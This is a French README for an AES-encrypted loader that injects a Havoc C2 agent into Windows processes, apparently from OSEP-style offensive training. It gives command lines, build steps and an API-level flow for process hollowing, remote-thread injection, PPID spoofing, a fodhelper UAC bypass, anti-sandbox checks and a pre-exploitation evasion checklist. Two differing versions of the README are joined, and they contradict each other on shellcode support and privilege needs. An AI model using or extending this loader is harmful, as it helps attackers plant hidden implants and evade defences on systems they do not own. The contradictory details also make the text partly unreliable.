# AES Loader - Havoc Agent Injector

Loader polyvalent pour injecter un agent Havoc chiffré en AES-256-CBC dans des processus Windows via **process hollowing**, **injection directe**, ou **UAC bypass**.

## 🎯 Fonctionnalités

- 🔐 **Chiffrement AES-256-CBC** avec seed aléatoire de 42 bytes + PBKDF2
- 💉 **Process Hollowing** : Remplace l'image d'un processus suspendu par votre PE
- 🪡 **APC Injection Intelligente** : Détecte automatiquement PE vs shellcode brut
- 🛡️ **Anti-Analysis** : Vérification virtualization + timing pour détecter les sandboxes
- 🔄 **Gestion des relocations** : Fixe automatiquement les adresses si ImageBase change
- 👻 **PPID Spoofing** : Fait croire que le processus vient d'un parent différent
- 🚀 **UAC Bypass** : Élévation de privilèges via fodhelper

## 📋 Usage Rapide

### Mode Process Hollowing (défaut)
```bash
# Créer svchost.exe suspendu et injecter le PE
.\loader.exe -v -h

# Hollowing avec cible personnalisée
.\loader.exe -v -h -f notepad.exe
.\loader.exe -v -h -f C:\Windows\calc.exe

# Avec PPID spoofing (le processus paraît venir du PID 500)
.\loader.exe -v -h --ppid 500
```

### Mode APC Injection (existing process)
```bash
# Injection directe dans un processus existant (PID 1464)
# Détecte automatiquement si c'est PE ou shellcode
.\loader.exe -p 1464 -v
```

### Mode UAC Bypass
```bash
# Élévation via fodhelper (fodhelper relance le loader)
.\loader.exe -u -v -h -f svchost.exe
```

### Options Complètes
```
-v, --verbose           Logs détaillés de debug
-h, --hollow            Process hollowing (défaut)
-f, --file PATH         Cible du hollowing (défaut: svchost.exe)
-p, --pid PID           APC injection dans processus existant
--ppid PPID             PPID spoofing (nécessite admin)
-u, --uac               UAC bypass via fodhelper
-a, --anti              Anti-analysis checks (auto avec -v)
--help                  Aide
```

## 🏗️ Architecture & Flux d'Exécution

### Phase 1: Initialisation
```
[Chiffrement] 
  ├─ Seed 42 bytes (aléatoire)
  ├─ Clé PBKDF2 32 bytes
  └─ IV 16 bytes

[Anti-Analysis]
  ├─ Détection virtualization (HyperV, VirtualBox, VMware)
  └─ Vérification timing
```

### Phase 2: Détection du Payload
```
[Décryption]
  └─ Seed + ciphertext → Plaintext

[Détection Type]
  ├─ Si DOS signature (0x4D5A) + PE signature → PE Payload
  └─ Sinon → Raw Shellcode
```

### Phase 3a: Process Hollowing (PE)
```
[Création processus suspendu]
  ├─ CreateProcessW(target_exe, CREATE_SUSPENDED)
  └─ PPID Spoofing (optionnel avec PROC_THREAD_ATTRIBUTE_PARENT_PROCESS)

[Parsing PE Header]
  ├─ DOS header (e_magic, e_lfanew)
  ├─ NT header (signature, ImageBase)
  └─ Section headers

[Allocation Mémoire]
  ├─ VirtualAllocEx à ImageBase préféré
  └─ Fallback allocation dynamique si occupée

[Injection PE]
  ├─ WriteProcessMemory: headers
  ├─ WriteProcessMemory: chaque section
  ├─ Relocation fixing (si delta ≠ 0)
  └─ PEB ImageBase update

[Exécution]
  ├─ GetThreadContext + SetThreadContext (RCX = EntryPoint)
  └─ ResumeThread
```

### Phase 3b: APC Injection (PE ou Shellcode)
```
[Détection Auto]
  ├─ Check DOS + PE signature → PE Path
  └─ Pas de signature → Shellcode Path

[PE Injection]
  ├─ OpenProcess(pid)
  ├─ VirtualAllocEx (try ImageBase, fallback dynamic)
  ├─ WriteProcessMemory (headers + sections)
  └─ CreateRemoteThread(EntryPoint)

[Shellcode Injection]
  ├─ OpenProcess(pid)
  ├─ VirtualAllocEx (dynamic)
  ├─ WriteProcessMemory (raw bytes)
  └─ CreateRemoteThread(shellcode_addr)
```

## 🔍 Détection Automatique: PE vs Shellcode

Le loader détecte **automatiquement** le type de payload:

```
PE Payload (MZ header):
  4d5a90000300000004000000ffff0000...
  ↓ MZ + PE signature
  → Injection PE complète (sections, relocations, PEB)
  
Raw Shellcode (code machine):
  564889e64883e4f04883ec20e80f0000...
  ↓ Pas de signature
  → Injection simple (allocation + thread)
```

**Logs de détection:**
```
[*] Smart injection - detecting payload type...
[*] Detected: PE payload
[+] Payload ImageBase: 0x140000000

OU

[*] Detected: Raw shellcode
[*] Allocating memory (103935 bytes)...
```

## 👻 PPID Spoofing

Change le parent apparent d'un processus:

```bash
# Normal: explorer.exe → loader.exe → svchost.exe
# Résultat: Parent de svchost = explorer

# Spoofé: svchost.exe → Parent PID 500
.\loader.exe -h -f svchost.exe --ppid 500
```

**Restrictions:**
- Nécessite droits administrateur
- Hollowing uniquement (pas APC)
- PID parent doit être valide

## 🚀 Cas d'Usage Typiques

| Scénario | Commande | Résultat |
|----------|----------|----------|
| **Injection basique** | `.\loader.exe -h` | svchost.exe créé + PE injecté |
| **Injection discrète** | `.\loader.exe -h -f notepad.exe` | notepad paraît actif |
| **PPID spoofing** | `.\loader.exe -h --ppid 500` | Process tree falsifié |
| **Injection existant** | `.\loader.exe -p 1464` | Auto-détecte PE/shellcode |
| **UAC + Hollowing** | `.\loader.exe -u -v -h -f calc.exe` | Auto-élévation |
| **Debug complet** | `.\loader.exe -v` | Logs PE, relocations, PEB |

## ⚠️ Restrictions & Limitations

### Privilèges Requis
- **Hollowing simple** : User normal ok
- **Hollowing + PPID** : Admin requis
- **Injection existant** : Dépend de la cible
- **UAC bypass** : User → Auto-relance en admin

### Format Payload
- **Hollowing** : PE complet (DOS + PE + sections) obligatoire
- **Injection** : PE ou shellcode brut (auto-détecté)
- **Architecture** : x64 uniquement

### Gestion ImageBase

| Situation | Comportement |
|-----------|-------------|
| ImageBase libre | Allocation à l'adresse préférée |
| ImageBase occupée | Allocation dynamique + relocation fixing |
| Pas de table reloc | Exécution à adresse aléatoire (risque crash) |

### Détections Possibles
- ✅ Anti-virtualization checks
- ✅ Timing verification
- ❌ Pas de anti-debugging
- ❌ Pas de code obfuscation

## 📦 Fichiers

| Fichier | Rôle |
|---------|------|
| `loader.cpp` | Point d'entrée, parsing args |
| `havoc_loader.cpp` | Déchiffrement |
| `process_hollower.cpp` | Hollowing (création + injection) |
| `process_injection.cpp` | Injection intelligente (PE + shellcode) |
| `crypto_funcs.cpp` | PBKDF2, hex utils |
| `easCipher42.cpp` | AES-256-CBC |
| `bypass_analysis.cpp` | Anti-VM + timing |
| `uac_bypass.cpp` | Elevation via fodhelper |
| `demon.x64.h` | Payload compilé (embedded) |
| `myenc.py` | Script de chiffrement |

## 🔧 Compilation

### Windows (MSVC)
```bash
cl /EHsc /std:c++17 /W4 ^
  loader.cpp havoc_loader.cpp process_hollower.cpp ^
  process_injection.cpp crypto_funcs.cpp ^
  bypass_analysis.cpp uac_bypass.cpp easCipher42.cpp ^
  /link kernel32.lib ntdll.lib advapi32.lib shell32.lib ole32.lib
```

### Linux (MinGW)
```bash
x86_64-w64-mingw32-g++ -std:c++17 -Wall -O2 \
  loader.cpp havoc_loader.cpp process_hollower.cpp \
  process_injection.cpp crypto_funcs.cpp \
  bypass_analysis.cpp uac_bypass.cpp easCipher42.cpp \
  -o loader.exe -lkernel32 -lntdll -ladvapi32 -lshell32 -lole32
```

## 🔐 Chiffrement du Payload

### Génération
```bash
python3 myenc.py <payload.bin> <seed.bin>
# Génère: demon.x64.h avec payload_enc
```

### Format
```
payload_enc: [seed (42 bytes) + ciphertext]
payload_enc_len: Longueur totale
```

### Déchiffrement Runtime
```
1. Read seed (42 bytes)
2. PBKDF2(seed) → key (32b) + iv (16b)
3. AES-256-CBC-decrypt(ciphertext, key, iv)
```

## 🐛 Debugging

### Activer Verbose
```bash
.\loader.exe -v
```

Affiche:
- Vérifications anti-analysis
- Clés/IVs
- Parsing PE (arch, ImageBase)
- Allocation mémoire (adresses)
- Sections écrites
- Relocations
- Contexte thread

### Logs Importants
```
[+] Payload ImageBase: 0x140000000      ← PE bien déchiffré
[+] Memory allocated at: 0x140000000    ← Alloc ok
[+] Relocations fixed                   ← Pas de crash reloc
[+] Process created: PID 5678           ← Process créé
[+] SUCCESS                             ← Exécution ok
```

---

**Version:** 2.0 | **Date:** 2025-12-30 | **Support:** PE x64 + Auto-detect payload

## Fonctionnalités

- 🔐 **Chiffrement AES-256-CBC** avec seed aléatoire de 42 bytes
- 💉 **Process Hollowing** : Remplace l'image d'un processus suspendu par votre PE
- 🪡 **APC Injection** : Injection via thread distant dans un processus existant
- 🛡️ **Anti-Analysis** : Détection virtualization + vérification timing
- 🔄 **Gestion des relocations** : Fixe automatiquement les adresses si ImageBase change

## Usage

```bash
# Process Hollowing (défaut)
.\loader.exe -h -v

# APC Injection dans un processus existant
.\loader.exe -p 1234 -v

# UAC Bypass via fodhelper
.\loader.exe -u -v

# Verbose uniquement
.\loader.exe -v
```

### Options
- `-h, --hollow` : Mode process hollowing (crée notepad/fodhelper)
- `-p, --pid PID` : APC injection dans processus existant (PID en décimal)
- `-u, --uac` : UAC bypass via fodhelper
- `-v, --verbose` : Logs détaillés de debug

## Flux d'exécution

### Process Hollowing (`-h`)
1. **Création processus** : Lance notepad/fodhelper en état suspendu
2. **Parsage PE** : Lit les headers du payload chiffré
3. **Allocation mémoire** : VirtualAllocEx à l'ImageBase du PE
4. **Injection sections** : Écrit headers + toutes les sections
5. **Relocations** : Fixe les références si ImageBase != attendu
6. **PEB update** : Modifie ImageBase dans la structure PEB
7. **Contexte thread** : Définit RCX au EntryPoint
8. **Reprise** : ResumeThread() → payload s'exécute

### APC Injection (`-p`)
1. **Ouverture processus** : OpenProcess(PROCESS_ALL_ACCESS, PID)
2. **Allocation** : Mémoire exécutable pour le shellcode
3. **Écriture** : WriteProcessMemory du payload
4. **Thread distant** : CreateRemoteThread à l'adresse du payload
5. **Attente** : WaitForSingleObject(10s timeout)

### UAC Bypass (`-u`)
1. **Registry hijacking** : Modifie clés MS-Settings
2. **Fodhelper relance** : ShellExecuteA avec "open" (auto-elevation)
3. **Réexécution** : Loader relancé avec droits admin

## Restrictions du Process Hollowing

### ⚠️ Droits Administrateur OBLIGATOIRES
**Pourquoi ?** Le process hollowing modifie directement l'espace mémoire d'un processus. Windows protège cette opération.

**Erreur** : `ERROR_ELEVATION_REQUIRED (740)`
```
[-] CreateProcessW failed: error 740
```

**Solution** :
- Exécuter en tant qu'administrateur
- Ou utiliser le UAC bypass (`-u`) au préalable

### 🎯 Cible de Processus
**Restrictions** :
- **Ne peut pas** : Services système (svchost, lsass, csrss)
- **Peut** : notepad, calc, explorer, cmd, etc.
- **Actuellement configuré** : Utilise l'exe spécifié dans le code

**Impact** : Processus sans droits = injection moins discrète

### 📦 Format du Payload
**OBLIGATOIRE** : PE valide (x86 ou x64)
- Headers DOS + PE valides
- Sections alignées
- Table de relocations (optionnel mais recommandé)

**NON supporté** :
- Shellcode brut sans headers PE
- DLL (nécessite relocation avancée)
- Payloads corrompus

### 🔄 Table de Relocations

**Fonctionnement** :
```
Payload ImageBase: 0x140000000
Memory alloué à:    0x7FFF0000
Delta = 0x7FFF0000 - 0x140000000 → Nécessite relocation
```

**Si ImageBase indisponible** :
- ✅ Allocation dynamique activée
- ✅ Table .reloc correctement appliquée
- ⚠️ Code mal écrit peut crasher si pas de relocations

**Vérification** :
```cpp
// Dans le code
lpImageNTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]
```

### 🚨 Exceptions/Limitations Connues

| Restriction | Raison | Contournement |
|------------|--------|----------------|
| Pas d'admin | Accès mémoire refusé | UAC bypass ou ElimateToken |
| ImageBase occupée | Adresse déjà en use | Relocation appliquée auto |
| Pas de table reloc | Crash probable | Générer PE avec compilateur modern |
| ASLR activé | Adresses aléatoires | Relocation gère ça automatiquement |
| DEP/NX enabled | Exécution bloquée | PAGE_EXECUTE_READWRITE l'active |
| ETW hooked | Détection possible | ObfuscateAPI ou direct syscalls |

### 🛡️ Détections Possibles

**Niveau User** :
- ProcessMonitor voit CreateProcessW + WriteProcessMemory
- Autoruns détecte les processus injected

**Niveau Kernel** :
- ETW (Event Tracing for Windows) enregistre les APIs
- Minifilter driver détecte les accès mémoire anormaux
- EDR/AV détecte les pattern d'injection connus

### ✅ Checklist Avant Exploitation

```
[x] Payload PE valide généré
[x] Headers correct (MZ + PE)
[x] Sections complètes
[x] Table reloc présente (fortement recommandé)
[x] ImageBase cohérent (0x140000000 par défaut pour x64)
[x] Droits administrateur actifs
[x] Pas d'EDR/AV détectant
[x] Cible de processus accessible
[x] Chiffrement AES-256 appliqué
[ ] Test en environnement isolé
```

## Architecture Technique

### Chiffrement
```
Plaintext: [SEED (42b)] + [Payload encrypté en AES-CBC]
                 ↓
           PBKDF2(SEED) → Key (32b) + IV (16b)
                 ↓
           AES-256-CBC encrypt
                 ↓
           Ciphertext binaire
```

### Injection (Hollowing)
```
Payload PE
    ↓
Parse Headers
    ↓
Créer Processus Suspendu
    ↓
Allouer Mémoire (ImageBase ou dynamique)
    ↓
Écrire Headers + Sections
    ↓
Fixer Relocations
    ↓
Update PEB ImageBase
    ↓
SetThreadContext(RCX → EntryPoint)
    ↓
ResumeThread()
    ↓
Payload Exécution
```

## Fichiers Clés

| Fichier | Rôle |
|---------|------|
| `havoc_loader_main.cpp` | Point d'entrée, parsing arguments |
| `process_hollower.cpp` | Logique du process hollowing |
| `process_injection.cpp` | CreateRemoteThread injection |
| `easCipher42.cpp` | Déchiffrement AES-256-CBC |
| `bypass_analysis.cpp` | Anti-VM + checks timing |
| `uac_bypass.cpp` | UAC elevation via fodhelper |
| `myenc.py` | Script de chiffrement/génération demon.x64.h |

## Compilation

```bash
# Windows avec MSVC
cl.exe /std:c++17 havoc_loader_main.cpp havoc_loader.cpp \
       process_hollower.cpp process_injection.cpp \
       easCipher42.cpp crypto_funcs.cpp bypass_analysis.cpp \
       uac_bypass.cpp /link kernel32.lib ntdll.lib
```

## Génération du Payload

```bash
# Générer demon.x64.h à partir d'un PE
python3 myenc.py -i payload.bin

# Ou générer + sauvegarder le chiffré
python3 myenc.py -i payload.bin -o encrypted.bin
```

## Limitations Connues

1. **Nécessite Admin** pour le hollowing standard
2. **Payload PE obligatoire** (pas de shellcode brut)
3. **Pas de support x86 réel** (code x64 seulement actuellement)
4. **ETW peut détecter** l'injection en environnement sécurisé
5. **UAC bypass dépassé** sur Windows 10/11 récent

## Améliorations Futures

- [ ] Support x86 natif
- [ ] Obfuscation des imports
- [ ] Syscalls directs (NtCreateProcess, etc)
- [ ] Injection dans .NET assemblies
- [ ] Memory-only execution (pas de fichier disque)
- [ ] Callback chains pour éviter détection

---

**Auteur** : OSEP Training
**Disclaimer** : À usage pédagogique et de test d'autorisation uniquement
